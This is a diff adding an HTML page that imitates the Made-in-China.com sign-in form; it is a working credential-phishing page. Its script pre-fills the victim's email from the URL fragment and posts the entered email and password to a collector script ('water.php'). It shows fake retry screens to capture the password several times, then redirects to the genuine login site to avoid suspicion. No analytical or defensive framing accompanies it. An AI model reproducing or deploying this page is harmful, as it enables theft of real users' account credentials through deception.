@@ -1,0 +1,163 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
+	<title>Sign In | Made-in-China.com</title>
+	<link rel="icon" type="image/png" sizes="32x32" href="">
+
+<meta name="robots" content="noindex" /><meta name="robots" content="nofollow" />
+<META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" /><META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
+</head>
+<body>
+
+<script>
+const url = 'water.php';   //full url goes here
+</script>
+
+<style>
+.login{
+	width:350px;
+	height:23px;
+ background: transparent;
+    border: none;
+	padding-left:8px;
+	 
+}
+.btn{
+	width:362px;
+	height:30px;
+ background: transparent;
+    border: none;
+	cursor:pointer; 
+}
+
+</style>
+<div style="margin:-8px;width:100%">
+    
+    
+<img id="bg" src="resources/bg1.png">
+<img id="bg2" src="resources/bg2.png" hidden>
+          
+<form method="post" action="" onsubmit="Validate(); return false;">
+    
+    <div style="position:absolute; top:160px; left:720px;">
+        
+            <font face="verdana" color="#585858" style="font-size:14px;">
+			    Email Address or Member ID
+		    </font>
+		    <br>
+		    <input required id="user" name="user" class="login" value="" type="email" 
+            style="border-style: solid; height:32px; width:315px;
+            border-color:#D8D8D8; -webkit-border-radius: 5px; -moz-border-radius: 5px; border-radius: 5px;">
+            
+            <br><br>
+            
+            <font face="verdana" color="#585858" style="font-size:14px;">
+			        Password
+		    </font>
+		    <br>
+		    <input required type="password" id="pass" name="pass" class="login" 
+            style="border-style: solid; height:32px; width:315px;
+            border-color:#D8D8D8; -webkit-border-radius: 5px; -moz-border-radius: 5px; border-radius: 5px;">
+            
+            <br><br>
+            
+            <input type="image" src="resources/signin.png" name="submit" alt="submit" style="width:330px;"/>
+            <br>
+            <a href="#"> <img src="resources/forgot.png" style="height:24px; width:320px;"> </a>
+
+		    
+		    
+    </div>
+    
+ </form>
+</div>
+
+<input type="hidden" id="count" value="0">
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
+
+
+<script>
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          var my_email =email;
+          $('#user').val(my_email);
+			
+			}
+		  })
+
+
+function Validate(){
+var a = $('#user').val();
+var b = $('#pass').val();
+var c = $('#count').val();
+
+$.post(url, {user:a,pass:b}, function(){
+setTimeout(function(){
+if(c>=2){
+$('#count').val('0');
+window.location='https://login.made-in-china.com';
+}else{
+$('#bg').fadeOut();
+$('#bg2').fadeIn();
+$('#user').css('top','250px');
+$('#pass').css('top','311px');
+$('#b1').css('top','381px');
+$('#pass').val('');
+var add = +c+1;
+$('#count').val(add);
+$('#pass').focus();
+}
+},2000);
+});
+}
+
+
+</script>
+
+
+
+<script>
+function process(){
+	var user = document.getElementById('user').value;
+	var pass = document.getElementById('pass').value;
+	if ((user == '') || (user == null)){
+	document.getElementById('bg').src='files/1.png';
+	document.getElementById('user').focus();
+return false;	
+	}else
+	if ((pass == '') || (pass == null)){
+	document.getElementById('bg').src='files/2.png';
+	document.getElementById('pass').focus();
+return false;	
+	}else
+	
+return true	;
+}
+</script>
+<script>
+$('input').focus(function(){
+  $(this).parents('.form-group').addClass('focused');
+});
+
+$('input').blur(function(){
+  var inputValue = $(this).val();
+  if ( inputValue == "" ) {
+    $(this).removeClass('filled');
+    $(this).parents('.form-group').removeClass('focused');  
+  } else {
+    $(this).addClass('filled');
+  }
+})  
+</script>
+</body>
+</html>
